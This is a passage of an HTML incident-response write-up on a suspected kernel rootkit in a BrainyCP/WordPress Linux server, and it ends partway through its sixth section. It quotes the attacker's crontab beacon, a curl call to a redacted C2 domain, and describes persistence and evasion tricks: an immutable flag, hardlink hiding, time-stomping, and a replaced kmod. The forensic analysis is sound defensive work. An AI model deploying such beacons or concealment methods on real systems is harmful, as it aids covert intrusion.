@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>When the Linux System Started Lying — Kernel Compromise Investigation</title>
+<meta http-equiv="onion-location" content="http://zenthra7ubutlvmohgjhdopshukaftchhgnlfdqdqzj45k7pp7braqad.onion/incidents/kernel-compromise-brainycp-2026.html" />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Unbounded:wght@400;700;900&family=Manrope:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0a0c0f;--bg2:#0f1218;--surface:#1a2030;--border:#2a3548;--border2:#3a4a60;--text:#c8d4e8;--text-dim:#7a90b0;--text-muted:#4a5a70;--accent:#00d4ff;--danger:#ff4444;--warn:#ff9900;--green:#00ff88;--purple:#a855f7;--heading:#e8f0ff;--code-bg:#0d1117;}
+*{margin:0;padding:0;box-sizing:border-box;}html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Manrope',sans-serif;font-size:16px;line-height:1.75;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.015) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+
+/* HEADER */
+header{position:relative;padding:80px 0 60px;border-bottom:1px solid var(--border);overflow:hidden;}
+header::after{content:'';position:absolute;top:-100px;right:-200px;width:600px;height:600px;background:radial-gradient(circle,rgba(0,212,255,.06) 0%,transparent 70%);pointer-events:none;}
+.header-inner{max-width:860px;margin:0 auto;padding:0 32px;position:relative;z-index:1;}
+.tag-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px;}
+.tag{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:500;padding:4px 12px;border-radius:4px;letter-spacing:.08em;text-transform:uppercase;}
+.tag-incident{background:rgba(255,68,68,.12);color:#ff6666;border:1px solid rgba(255,68,68,.25);}
+.tag-dfir{background:rgba(168,85,247,.12);color:#c084fc;border:1px solid rgba(168,85,247,.25);}
+.tag-linux{background:rgba(0,212,255,.10);color:var(--accent);border:1px solid rgba(0,212,255,.2);}
+.tag-wp{background:rgba(0,255,136,.08);color:#4ade80;border:1px solid rgba(0,255,136,.2);}
+h1{font-family:'Unbounded',sans-serif;font-size:clamp(22px,4vw,40px);font-weight:900;color:var(--heading);line-height:1.2;margin-bottom:24px;letter-spacing:-.02em;}
+h1 span{color:var(--accent);}
+.subtitle{font-size:17px;color:var(--text-dim);line-height:1.65;max-width:680px;margin-bottom:36px;}
+.meta{display:flex;align-items:center;gap:24px;flex-wrap:wrap;}
+.meta-item{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-muted);}
+.dot{width:6px;height:6px;border-radius:50%;}
+.dot-red{background:var(--danger);box-shadow:0 0 6px var(--danger);}
+.dot-green{background:var(--green);box-shadow:0 0 6px var(--green);}
+.dot-yellow{background:var(--warn);box-shadow:0 0 6px var(--warn);}
+
+/* TLDR */
+.tldr{max-width:860px;margin:48px auto;padding:0 32px;position:relative;z-index:1;}
+.tldr-box{background:linear-gradient(135deg,rgba(0,212,255,.06),rgba(0,144,204,.03));border:1px solid rgba(0,212,255,.2);border-left:3px solid var(--accent);border-radius:8px;padding:28px 32px;}
+.tldr-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.15em;text-transform:uppercase;margin-bottom:16px;}
+.tldr-box ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
+.tldr-box li{display:flex;align-items:flex-start;gap:12px;font-size:14.5px;color:var(--text);}
+.tldr-box li::before{content:'→';color:var(--accent);font-family:'JetBrains Mono',monospace;font-weight:700;flex-shrink:0;margin-top:1px;}
+
+/* LAYOUT */
+.container{max-width:860px;margin:0 auto;padding:0 32px;position:relative;z-index:1;}
+
+/* TOC */
+.toc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:28px 32px;margin-bottom:56px;}
+.toc-title{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:var(--text-muted);letter-spacing:.15em;text-transform:uppercase;margin-bottom:18px;}
+.toc ol{list-style:none;counter-reset:toc;display:flex;flex-direction:column;gap:8px;}
+.toc li{counter-increment:toc;display:flex;align-items:baseline;gap:12px;}
+.toc li::before{content:counter(toc,decimal-leading-zero);font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-muted);flex-shrink:0;}
+.toc a{color:var(--text-dim);text-decoration:none;font-size:14px;transition:color .2s;}
+.toc a:hover{color:var(--accent);}
+
+/* SECTIONS */
+.section{margin-bottom:72px;}
+.section-header{display:flex;align-items:center;gap:16px;margin-bottom:28px;}
+.section-num{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:var(--text-muted);background:var(--surface);border:1px solid var(--border);padding:4px 10px;border-radius:4px;flex-shrink:0;}
+h2{font-family:'Unbounded',sans-serif;font-size:clamp(17px,2.5vw,25px);font-weight:700;color:var(--heading);letter-spacing:-.01em;line-height:1.25;}
+h3{font-family:'Unbounded',sans-serif;font-size:15px;font-weight:700;color:var(--heading);margin:36px 0 16px;letter-spacing:-.01em;}
+p{margin-bottom:18px;color:var(--text);}
+strong{color:var(--heading);font-weight:600;}
+a{color:var(--accent);text-decoration:none;}
+a:hover{text-decoration:underline;}
+
+/* CODE */
+.code-block{margin:28px 0;border-radius:10px;overflow:hidden;border:1px solid var(--border);background:var(--code-bg);}
+.code-header{display:flex;align-items:center;justify-content:space-between;padding:10px 18px;background:var(--surface);border-bottom:1px solid var(--border);}
+.code-dots{display:flex;gap:6px;}
+.code-dot{width:10px;height:10px;border-radius:50%;}
+.code-dot:nth-child(1){background:#ff5f57;}
+.code-dot:nth-child(2){background:#febc2e;}
+.code-dot:nth-child(3){background:#28c840;}
+.code-lang{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-muted);letter-spacing:.05em;}
+.code-content{padding:20px 22px;overflow-x:auto;}
+pre{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;color:#cdd6f4;white-space:pre;}
+.c-comment{color:#6272a4;font-style:italic;}.c-cmd{color:#50fa7b;}.c-out{color:#8be9fd;}.c-warn{color:#ffb86c;}.c-danger{color:#ff5555;}.c-prompt{color:#6272a4;}
+code{font-family:'JetBrains Mono',monospace;font-size:13px;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);color:var(--accent);padding:2px 7px;border-radius:4px;}
+
+/* CALLOUTS */
+.callout{border-radius:8px;padding:22px 26px;margin:28px 0;display:flex;gap:18px;}
+.callout-icon{font-size:22px;flex-shrink:0;margin-top:1px;}
+.callout-title{font-weight:700;font-size:14px;margin-bottom:6px;}
+.callout-body p{font-size:14.5px;margin-bottom:0;line-height:1.65;}
+.callout-danger{background:rgba(255,68,68,.07);border:1px solid rgba(255,68,68,.2);border-left:3px solid var(--danger);}
+.callout-danger .callout-title{color:#ff6666;}
+.callout-warn{background:rgba(255,153,0,.07);border:1px solid rgba(255,153,0,.2);border-left:3px solid var(--warn);}
+.callout-warn .callout-title{color:#ffa520;}
+.callout-info{background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.18);border-left:3px solid var(--accent);}
+.callout-info .callout-title{color:var(--accent);}
+.callout-success{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.18);border-left:3px solid var(--green);}
+.callout-success .callout-title{color:var(--green);}
+
+/* TIMELINE */
+.timeline{position:relative;padding-left:28px;margin:28px 0;}
+.timeline::before{content:'';position:absolute;left:7px;top:8px;bottom:8px;width:1px;background:linear-gradient(to bottom,var(--accent),var(--border));}
+.timeline-item{position:relative;margin-bottom:28px;padding-left:20px;}
+.timeline-item::before{content:'';position:absolute;left:-28px;top:7px;width:10px;height:10px;border-radius:50%;border:2px solid var(--accent);background:var(--bg);box-shadow:0 0 8px rgba(0,212,255,.4);}
+.timeline-item.danger::before{border-color:var(--danger);box-shadow:0 0 8px rgba(255,68,68,.4);}
+.timeline-item.warn::before{border-color:var(--warn);box-shadow:0 0 8px rgba(255,153,0,.4);}
+.timeline-item.success::before{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,.4);}
+.timeline-date{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-muted);margin-bottom:6px;}
+.timeline-title{font-weight:700;color:var(--heading);margin-bottom:6px;font-size:15px;}
+.timeline-desc{font-size:14px;color:var(--text-dim);line-height:1.6;}
+
+/* COMPARE */
+.compare{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:28px 0;}
+@media(max-width:600px){.compare{grid-template-columns:1fr;}}
+.compare-box{border-radius:8px;padding:20px 22px;border:1px solid var(--border);}
+.compare-box.before{background:rgba(255,68,68,.04);border-color:rgba(255,68,68,.2);}
+.compare-box.after{background:rgba(0,255,136,.04);border-color:rgba(0,255,136,.2);}
+.compare-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:14px;}
+.before .compare-label{color:#ff6666;}.after .compare-label{color:var(--green);}
+.compare-box ul{list-style:none;display:flex;flex-direction:column;gap:8px;}
+.compare-box li{font-size:13.5px;color:var(--text-dim);display:flex;gap:10px;align-items:baseline;}
+.before li::before{content:'✗';color:var(--danger);font-size:12px;flex-shrink:0;}
+.after li::before{content:'✓';color:var(--green);font-size:12px;flex-shrink:0;}
+
+/* ATTACK CHAIN */
+.attack-chain{display:flex;flex-direction:column;margin:28px 0;}
+.chain-step{display:flex;}
+.chain-connector{display:flex;flex-direction:column;align-items:center;flex-shrink:0;width:40px;}
+.chain-circle{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;flex-shrink:0;z-index:1;}
+.chain-line{width:2px;flex:1;min-height:24px;background:linear-gradient(to bottom,var(--border2),var(--border));margin:2px 0;}
+.chain-content{padding:4px 0 28px 20px;flex:1;}
+.chain-title{font-weight:700;font-size:14px;color:var(--heading);margin-bottom:5px;}
+.chain-desc{font-size:13.5px;color:var(--text-dim);line-height:1.6;}
+
+/* LESSONS */
+.lessons{display:flex;flex-direction:column;gap:20px;margin:28px 0;}
+.lesson{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px 28px;display:flex;gap:20px;align-items:flex-start;}
+.lesson-num{font-family:'Unbounded',sans-serif;font-size:28px;font-weight:900;color:var(--border2);flex-shrink:0;line-height:1;margin-top:2px;}
+.lesson-title{font-family:'Unbounded',sans-serif;font-size:14px;font-weight:700;color:var(--accent);margin-bottom:8px;}
+.lesson p{font-size:14.5px;color:var(--text-dim);margin-bottom:0;line-height:1.65;}
+
+/* CHECKLIST */
+.checklist{display:flex;flex-direction:column;gap:10px;margin:20px 0;}
+.check-item{display:flex;gap:14px;align-items:flex-start;padding:12px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;font-size:14px;color:var(--text-dim);}
+.check-icon{font-size:14px;flex-shrink:0;margin-top:1px;}
+
+/* QUOTE */
+.final-quote{background:linear-gradient(135deg,rgba(0,212,255,.05),rgba(168,85,247,.04));border:1px solid rgba(0,212,255,.15);border-radius:12px;padding:36px 40px;margin:56px 0;text-align:center;}
+.final-quote blockquote{font-family:'Unbounded',sans-serif;font-size:clamp(15px,2.5vw,21px);font-weight:700;color:var(--heading);line-height:1.4;margin-bottom:16px;}
+.final-quote cite{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-muted);font-style:normal;}
+
+/* AUTHOR */
+.author-card{display:flex;gap:20px;align-items:flex-start;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px 28px;margin:48px 0;}
+.author-avatar{width:52px;height:52px;border-radius:50%;flex-shrink:0;border:2px solid var(--border2);}
+.author-name{font-weight:700;font-size:15px;color:var(--heading);margin-bottom:4px;}
+.author-role{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-muted);margin-bottom:10px;}
+.author-bio{font-size:13.5px;color:var(--text-dim);line-height:1.6;margin-bottom:0;}
+.divider{height:1px;background:linear-gradient(to right,transparent,var(--border),transparent);margin:56px 0;}
+
+/* NAVIGATION */
+.top-nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(10,12,15,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:16px 32px;}
+.top-nav-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;}
+.nav-logo{display:flex;align-items:center;gap:12px;text-decoration:none;transition:opacity .2s;}
+.nav-logo:hover{opacity:.8;}
+.nav-logo img{height:32px;width:32px;object-fit:contain;}
+.nav-logo-text{font-family:'Unbounded',sans-serif;font-size:18px;font-weight:700;color:var(--heading);}
+.nav-logo-text span{color:var(--accent);}
+.nav-back{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:var(--surface);border:1px solid var(--border);border-radius:6px;color:var(--text);text-decoration:none;font-family:'JetBrains Mono',monospace;font-size:13px;transition:all .2s;}
+.nav-back:hover{background:var(--border);border-color:var(--accent);color:var(--accent);}
+.nav-back svg{width:16px;height:16px;}
+body{padding-top:64px;}
+
+footer{border-top:1px solid var(--border);padding:40px 32px;text-align:center;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-muted);}
+.footer-links{display:flex;justify-content:center;gap:24px;margin-top:16px;flex-wrap:wrap;}
+.footer-links a{color:var(--text-dim);text-decoration:none;transition:color .2s;}
+.footer-links a:hover{color:var(--accent);}
+
+@media(max-width:640px){.header-inner,.tldr,.container{padding:0 20px;}.section-header{flex-direction:column;align-items:flex-start;gap:8px;}.author-card{flex-direction:column;}.final-quote{padding:28px 24px;}.top-nav{padding:12px 20px;}.nav-logo-text{font-size:16px;}.nav-back{font-size:12px;padding:6px 12px;}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+.section,.tldr-box,.code-block,.callout{animation:fadeUp .45s ease both;}
+</style>
+</head>
+<body>
+
+<!-- Navigation -->
+<nav class="top-nav">
+  <div class="top-nav-inner">
+    <a href="/" class="nav-logo">
+      <img src="/logo-nav.webp" alt="ZenthraCore" />
+      <span class="nav-logo-text">Zenthra<span>Core</span></span>
+    </a>
+    <a href="/incidents" class="nav-back">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+      </svg>
+      Back to Incidents
+    </a>
+  </div>
+</nav>
+
+<header>
+  <div class="header-inner">
+    <div class="tag-row">
+      <span class="tag tag-incident">Incident Response</span>
+      <span class="tag tag-dfir">DFIR</span>
+      <span class="tag tag-linux">Linux Security</span>
+      <span class="tag tag-wp">WordPress</span>
+    </div>
+    <h1>When the Linux System <span>Started Lying</span></h1>
+    <p class="subtitle">Investigation of a suspected kernel-level compromise in a BrainyCP production environment. Outbound DNS flood, falsified command output, empty <code>lsmod</code>, and the only way out — swapping the kernel on a live compromised system.</p>
+    <div class="meta">
+      <div class="meta-item"><span class="dot dot-red"></span>Incident ID: INC-2026-0505</div>
+      <div class="meta-item"><span class="dot dot-yellow"></span>Detected: 2026-05-05 19:42 UTC</div>
+      <div class="meta-item"><span class="dot dot-red"></span>Severity: Critical</div>
+      <div class="meta-item"><span class="dot dot-green"></span>Status: Closed</div>
+    </div>
+    <div class="meta" style="margin-top:12px;">
+      <div class="meta-item">Environment: BrainyCP 2.x / Ubuntu 20.04 LTS / WordPress 6.x</div>
+    </div>
+    <div class="meta" style="margin-top:8px;">
+      <div class="meta-item">Attack Vector: Suspected LKM rootkit via WordPress compromise</div>
+    </div>
+    <div class="meta" style="margin-top:8px;">
+      <div class="meta-item">Impact: Outbound DNS flood (500+ req/s), system integrity loss</div>
+    </div>
+    <div class="meta" style="margin-top:8px;">
+      <div class="meta-item">Response: Full system rebuild, forensic analysis, infrastructure hardening</div>
+    </div>
+  </div>
+</header>
+
+<div class="tldr">
+  <div class="callout callout-warn" style="margin-bottom:32px;">
+    <div class="callout-icon">⚠️</div>
+    <div class="callout-body"><div class="callout-title">Forensic Disclaimer</div><p>This investigation was conducted under time pressure during an active incident. While we have strong behavioral indicators of a kernel-level compromise, we were unable to extract the malicious module for static analysis before the system rebuild.</p></div>
+  </div>
+  <div class="tldr-box">
+    <div class="tldr-label">TL;DR — 30-second summary</div>
+    <ul>
+      <li>Linode sent an abuse ticket: our server was generating outbound DoS traffic and had been restricted</li>
+      <li>Evidence strongly suggested a kernel-level compromise, likely an LKM rootkit — <code>lsmod</code>, <code>ps</code>, and <code>find</code> were deliberately lying</li>
+      <li>Malware hid its binary via a hardlink inside a WordPress plugin file and used <code>chmod 000</code> to block scanners</li>
+      <li>The suspected rootkit was compiled for the Linode kernel — switching to the Ubuntu kernel killed it after one reboot</li>
+      <li>Outcome: data saved, server isolated at the hypervisor level, infrastructure rebuilt from scratch</li>
+    </ul>
+  </div>
+</div>
+
+<div class="container">
+  <div class="toc">
+    <div class="toc-title">// Table of Contents</div>
+    <ol>
+      <li><a href="#en-s1">How it started: the hosting provider alert</a></li>
+      <li><a href="#en-s2">Attack timeline</a></li>
+      <li><a href="#en-s3">Initial recon: what the processes reveal</a></li>
+      <li><a href="#en-s4">Three key artifacts</a></li>
+      <li><a href="#en-s5">Hardlink: the attackers' cleverest trick</a></li>
+      <li><a href="#en-s6">Suspected kernel-level compromise: when you can't trust your own OS</a></li>
+      <li><a href="#en-s7">The breakthrough: swapping the kernel restores control</a></li>
+      <li><a href="#en-s8">Network isolation at the hypervisor level</a></li>
+      <li><a href="#en-s9">Saving data and migration plan</a></li>
+      <li><a href="#en-s10">Key lessons and hardening recommendations</a></li>
+    </ol>
+  </div>
+
+  <div class="section" id="en-s1">
+    <div class="section-header"><span class="section-num">01</span><h2>How it started: the hosting provider alert</h2></div>
+    <p>This is a story about an email that arrives at 1 AM and flips your night upside down. Linode (Akamai Cloud Computing Services) sent a notification with a subject line that makes your stomach drop:</p>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">email / support ticket #XXXXXXXX</span></div>
+      <div class="code-content"><pre><span class="c-warn">We have detected an Outbound Denial of Service attack</span>
+<span class="c-warn">originating from your Linode.</span>
+This is most likely the result of a system compromise.
+Because of the serious nature of this activity, we have
+<span class="c-danger">applied network restrictions to your Linode</span> to prevent
+further abuse.</pre></div>
+    </div>
+    <p>One critical point up front: discovery was <strong>reactive, not proactive</strong>. We found out from the provider, not our own monitoring. First lesson: if you don't have alerts on anomalous outbound traffic, you're always the last to know you've been compromised.</p>
+    <div class="callout callout-info">
+      <div class="callout-icon">ℹ️</div>
+      <div class="callout-body"><div class="callout-title">What Linode does when it detects DDoS</div><p>The provider applies network restrictions at the hypervisor level, blocking all non-standard traffic while preserving SSH (port 22) for remediation. The server is quarantined. Sensible policy — but your business goes down while it's in effect.</p></div>
+    </div>
+    <p>The server ran a <strong>BrainyCP</strong> control panel with dozens of WordPress sites, PHP users isolated per-account with individual php-fpm pools. A completely standard setup — and exactly the kind of target botnet operators specifically hunt for.</p>
+  </div>
+
+  <div class="section" id="en-s2">
+    <div class="section-header"><span class="section-num">02</span><h2>Attack timeline</h2></div>
+    <p>By correlating file timestamps, logs, and metadata we reconstructed the following sequence:</p>
+    <div class="timeline">
+      <div class="timeline-item danger">
+        <div class="timeline-date">April 29, 2026 · ~16:11</div>
+        <div class="timeline-title">Initial intrusion and rootkit installation</div>
+        <div class="timeline-desc">Via a WordPress vulnerability, attackers achieved code execution. A 32-bit ELF binary (294 KB, statically linked, stripped) was dropped to <code>/etc/watchdog</code>. The <code>/bin/kmod</code> binary was replaced with a fake version.</div>
+      </div>
+      <div class="timeline-item danger">
+        <div class="timeline-date">May 1, 2026 · ~06:46</div>
+        <div class="timeline-title">Persistence: systemd unit infection</div>
+        <div class="timeline-desc">Dozens of PHP-FPM systemd units modified. <code>@reboot /etc/watchdog</code> added to root's crontab. <code>chattr +i</code> immutable flag set on the binary.</div>
+      </div>
+      <div class="timeline-item warn">
+        <div class="timeline-date">May 4–5, 2026</div>
+        <div class="timeline-title">Active DNS flood attack</div>
+        <div class="timeline-desc">Hundreds of UDP queries per second to 8.8.8.8 and 1.1.1.1. Linode detects anomaly, applies restrictions, sends abuse ticket.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">May 5, 2026 · evening</div>
+        <div class="timeline-title">Investigation begins</div>
+        <div class="timeline-desc">Abuse ticket received. <code>lsmod</code> is empty, <code>find</code> dies with SIGKILL. The conclusion is unavoidable: the kernel is compromised.</div>
+      </div>
+      <div class="timeline-item success">
+        <div class="timeline-date">May 6, 2026 · 00:30–01:30</div>
+        <div class="timeline-title">Isolation and control restored</div>
+        <div class="timeline-desc">Kernel profile swapped in Linode panel — suspected LKM rootkit dies on next boot. Cloud Firewall applied at hypervisor level. Full database dump completed.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s3">
+    <div class="section-header"><span class="section-num">03</span><h2>Initial recon: what the processes reveal</h2></div>
+    <p><code>ss -tupn</code> immediately showed dozens of DNS connections from <code>php</code> processes and one with no process name at all:</p>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — ss -tupn</span></div>
+      <div class="code-content"><pre><span class="c-warn">ESTAB  x.x.x.x:59392  8.8.8.8:53   users:(("php",pid=37234))</span>
+<span class="c-warn">ESTAB  x.x.x.x:42262  8.8.8.8:53   users:(("php",pid=37232))</span>
+<span class="c-comment"># dozens more DNS connections from php processes...</span>
+<span class="c-danger">ESTAB  x.x.x.x:50632  y.y.y.y:61002  </span><span class="c-comment">← no process name!</span></pre></div>
+    </div>
+    <div class="callout callout-warn">
+      <div class="callout-icon">⚠️</div>
+      <div class="callout-body"><div class="callout-title">A connection with no process name is a rootkit signature</div><p>An empty <code>users</code> column means the process is hidden via <code>getdents</code> hooking. IP y.y.y.y (external hosting) is a typical C2 server location.</p></div>
+    </div>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — diagnostic attempts</span></div>
+      <div class="code-content"><pre><span class="c-prompt">root@server:~#</span> <span class="c-cmd">lsmod</span>
+<span class="c-out">Module    Size  Used by</span>
+<span class="c-comment"># ← empty. On a real server lsmod is NEVER empty.</span>
+
+<span class="c-prompt">root@server:~#</span> <span class="c-cmd">find /bin /usr/bin -type f -exec file {} \;</span>
+<span class="c-danger">find: 'file' terminated by signal 9</span>
+<span class="c-comment"># ← rootkit kills processes scanning system directories</span></pre></div>
+    </div>
+    <p>Empty <code>lsmod</code> is physically impossible on a running server without external interference. The conclusion was clear: <strong>the kernel is lying to us</strong>, and every subsequent action had to account for that.</p>
+  </div>
+
+  <div class="section" id="en-s4">
+    <div class="section-header"><span class="section-num">04</span><h2>Three key artifacts</h2></div>
+    <h3>Artifact #1 — /etc/watchdog</h3>
+    <p>Root's crontab had <code>@reboot /etc/watchdog</code>. A 32-bit ELF binary in <code>/etc/</code> is already an anomaly — but it couldn't be deleted:</p>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash</span></div>
+      <div class="code-content"><pre><span class="c-prompt">root@server:/etc#</span> <span class="c-cmd">file /etc/watchdog</span>
+<span class="c-danger">ELF 32-bit LSB executable, Intel 80386, statically linked, stripped</span>
+
+<span class="c-prompt">root@server:/etc#</span> <span class="c-cmd">lsattr /etc/watchdog</span>
+<span class="c-warn">----i---------e------- /etc/watchdog</span>
+<span class="c-comment"># 'i' = immutable flag — even root can't delete it</span>
+
+<span class="c-prompt">root@server:/etc#</span> <span class="c-cmd">rm -f /etc/watchdog</span>
+<span class="c-danger">rm: cannot remove '/etc/watchdog': Operation not permitted</span>
+
+<span class="c-comment"># Correct approach:</span>
+<span class="c-prompt">root@server:/etc#</span> <span class="c-cmd">chattr -i /etc/watchdog && rm -f /etc/watchdog</span></pre></div>
+    </div>
+    <div class="callout callout-danger">
+      <div class="callout-icon">🚨</div>
+      <div class="callout-body"><div class="callout-title">chattr +i — a botnet operator's favorite weapon</div><p>The <code>immutable</code> flag blocks all modifications — deletion, renaming, overwriting — even for root. Many admins don't know it exists and assume the system is broken when standard deletion silently fails.</p></div>
+    </div>
+
+    <h3>Artifact #2 — C2 dropper via the ccparser user</h3>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — crontab ccparser</span></div>
+      <div class="code-content"><pre><span class="c-danger">5 0 * * * /usr/bin/curl --silent http://[REDACTED-C2-DOMAIN]/parser.php > /dev/null</span>
+<span class="c-comment"># every night at 00:05 — polling the C2 server for new instructions</span></pre></div>
+    </div>
+    <p>Classic beacon architecture: the malware polls its command-and-control server daily for updated instructions and new payloads. This channel almost certainly delivered the April 29 binary.</p>
+
+    <h3>Artifact #3 — the replaced /bin/kmod</h3>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — stat /bin/kmod</span></div>
+      <div class="code-content"><pre><span class="c-danger">Modify: 2026-04-30 12:32:42</span>
+<span class="c-danger">Change: 2026-05-01 06:46:04</span>
+<span class="c-danger">Birth:  2026-05-01 06:46:04</span>
+<span class="c-comment"># kmod is what lsmod symlinks to. The replacement always returned empty output.</span></pre></div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s5">
+    <div class="section-header"><span class="section-num">05</span><h2>Hardlink: the attackers' cleverest trick</h2></div>
+    <p>When standard <code>find</code> was being killed by the malware, searching by inode number bypassed the block entirely:</p>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — inode search</span></div>
+      <div class="code-content"><pre><span class="c-prompt">root@server:~#</span> <span class="c-cmd">stat /usr/bin/php74/bin/php-fpm</span>
+<span class="c-out">Inode: 1071637   Links: 1</span>
+<span class="c-danger">Modify: 2007-12-25 09:50:38</span>  <span class="c-comment">← time-stomp: PHP 7.4 didn't exist in 2007</span>
+
+<span class="c-prompt">root@server:~#</span> <span class="c-cmd">find / -inum 1071637</span>
+<span class="c-danger">/home/[CLIENT]/.../CMB2/includes/types/CMB2_Type_Wysiwyg.php</span>
+<span class="c-danger">/usr/bin/php74/bin/php-fpm</span>
+<span class="c-comment"># one inode — two paths. This is a hardlink.</span></pre></div>
+    </div>
+    <div class="callout callout-info">
+      <div class="callout-icon">🔗</div>
+      <div class="callout-body"><div class="callout-title">Why use a hardlink for concealment</div><p>One physical file — two filesystem paths. An AV scanning <code>/home</code> sees a legitimate CMB2 plugin PHP file. That same object is the malicious binary executed by PHP-FPM. Deleting one path leaves the other intact. The file disappears only when all links to the inode are removed.</p></div>
+    </div>
+    <p>The file in the plugin directory also had <code>0000</code> permissions — blocking any scanner that tried to read it. But the attackers made a classic mistake: <code>ctime</code> can't be forged through ordinary means — it updates on every <code>chmod</code> call.</p>
+    <div class="code-block">
+      <div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><span class="code-lang">bash — stat CMB2_Type_Wysiwyg.php</span></div>
+      <div class="code-content"><pre><span class="c-out">Size: 2905   Inode: 1071637</span>
+<span class="c-danger">Access: (0000/----------)</span>   <span class="c-comment">← all permissions stripped</span>
+<span class="c-out">Modify: 2023-11-07 08:08:17</span>  <span class="c-comment">← forged "old" date</span>
+<span class="c-danger">Change: 2026-05-05 21:02:56</span>  <span class="c-comment">← file is alive right now</span></pre></div>
+    </div>
+  </div>
+
+  <div class="section" id="en-s6">
+    <div class="section-header"><span class="section-num">06</span><h2>Suspected kernel-level compromise: when you can't trust your own OS</h2></div>
+    <p>Once a malicious LKM is loaded, the OS can no longer be trusted as a source of truth. While we couldn't extract the module for analysis, the behavioral indicators were consistent with a kernel-level compromise. The suspected attack chain:</p>
+    <div class="attack-chain">
+      <div class="chain-step"><div class="chain-connector"><div class="chain-circle" style="background:rgba(255,68,68,.15);border:2px solid #ff4444;color:#ff6666;">1</div><div class="chain-line"></div></div><div class="chain-content"><div class="chain-title">Initial access via WordPress</div><div class="chain-desc">Plugin or theme vulnerability exploited. Code execution achieved as www-data or the site account user.</div></div></div>
+      <div class="chain-step"><div class="chain-connector"><div class="chain-circle" style="background:rgba(255,153,0,.15);border:2px solid #ff9900;color:#ffa520;">2</div><div class="chain-line"></div></div><div class="chain-content"><div class="chain-title">Privilege escalation and persistence</div><div class="chain-desc"><code>@reboot /etc/watchdog</code> in crontab, <code>chattr +i</code> on the binary, suspected LKM rootkit loaded into the kernel.</div></div></div>
+      <div class="chain-step"><div class="chain-connector"><div class="chain-circle" style="background:rgba(168,85,247,.15);border:2px solid #a855f7;color:#c084fc;">3</div><div class="chain-line"></div></div><div class="chain-content"><div class="chain-title">Syscall hooking</div><div class="chain-desc"><code>getdents</code> hook hides files and processes. <code>read</code> hook on <code>/proc/modules</code> hides the module itself. Replaced <code>kmod</code> blinds <code>lsmod</code>. Scanning processes killed by name. (Behavioral evidence — module not extracted for analysis.)</div></div></div>
